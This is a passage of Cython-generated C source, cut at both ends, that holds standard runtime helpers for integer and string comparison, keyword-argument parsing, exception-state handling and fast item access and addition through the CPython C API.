    if (likely(PyLong_CheckExact(op1))) {
        int unequal;
        unsigned long uintval;
        Py_ssize_t size = Py_SIZE(op1);
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        if (intval == 0) {
            if (size == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
        } else if (intval < 0) {
            if (size >= 0)
                Py_RETURN_FALSE;
            intval = -intval;
            size = -size;
        } else {
            if (size <= 0)
                Py_RETURN_FALSE;
        }
        uintval = (unsigned long) intval;
#if PyLong_SHIFT * 4 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 4)) {
            unequal = (size != 5) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[4] != ((uintval >> (4 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 3 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 3)) {
            unequal = (size != 4) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 2 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 2)) {
            unequal = (size != 3) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 1 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 1)) {
            unequal = (size != 2) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
            unequal = (size != 1) || (((unsigned long) digits[0]) != (uintval & (unsigned long) PyLong_MASK));
        if (unequal == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
        if ((double)a == (double)b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    return (
        PyObject_RichCompare(op1, op2, Py_EQ));
}

/* DictGetItem */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key) {
    PyObject *value;
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (!PyErr_Occurred()) {
            if (unlikely(PyTuple_Check(key))) {
                PyObject* args = PyTuple_Pack(1, key);
                if (likely(args)) {
                    PyErr_SetObject(PyExc_KeyError, args);
                    Py_DECREF(args);
                }
            } else {
                PyErr_SetObject(PyExc_KeyError, key);
            }
        }
        return NULL;
    }
    Py_INCREF(value);
    return value;
}
#endif

/* RaiseArgTupleInvalid */
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}

/* RaiseDoubleKeywords */
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}

/* ParseKeywords */
static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (**name == key) ? 0 :
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key);
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}

/* BytesEquals */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char *ps1, *ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        } else if (length == 1) {
            return (equals == Py_EQ);
        } else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}

/* UnicodeEquals */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void *data1, *data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
        #if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
        #else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
        #endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        } else if (length == 1) {
            goto return_eq;
        } else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
            #if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
            #endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    } else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        #if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
        #endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_EQ);
return_ne:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_NE);
#endif
}

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    PyObject *exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
    if (unlikely(PyTuple_Check(err)))
        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* SwapException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
    #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif

/* PyUnicode_Unicode */
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_Unicode(PyObject *obj) {
    if (unlikely(obj == Py_None))
        obj = __pyx_kp_u_None;
    return __Pyx_NewRef(obj);
}

/* GetItemInt */
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

/* RaiseTooManyValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected) {
    PyErr_Format(PyExc_ValueError,
                 "too many values to unpack (expected %" CYTHON_FORMAT_SSIZE_T "d)", expected);
}

/* RaiseNeedMoreValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index) {
    PyErr_Format(PyExc_ValueError,
                 "need more than %" CYTHON_FORMAT_SSIZE_T "d value%.1s to unpack",
                 index, (index == 1) ? "" : "s");
}

/* IterFinish */
static CYTHON_INLINE int __Pyx_IterFinish(void) {
#if CYTHON_FAST_THREAD_STATE
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject* exc_type = tstate->curexc_type;
    if (unlikely(exc_type)) {
        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) {
            PyObject *exc_value, *exc_tb;
            exc_value = tstate->curexc_value;
            exc_tb = tstate->curexc_traceback;
            tstate->curexc_type = 0;
            tstate->curexc_value = 0;
            tstate->curexc_traceback = 0;
            Py_DECREF(exc_type);
            Py_XDECREF(exc_value);
            Py_XDECREF(exc_tb);
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#else
    if (unlikely(PyErr_Occurred())) {
        if (likely(PyErr_ExceptionMatches(PyExc_StopIteration))) {
            PyErr_Clear();
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#endif
}

/* UnpackItemEndCheck */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected) {
    if (unlikely(retval)) {
        Py_DECREF(retval);
        __Pyx_RaiseTooManyValuesError(expected);
        return -1;
    }
    return __Pyx_IterFinish();
}

/* PyIntBinop */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
    (void)zerodivision_check;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
            x = (long)((unsigned long)a + b);
            if (likely((x^a) >= 0 || (x^b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        } else {
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
                x = a + b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla + llb;
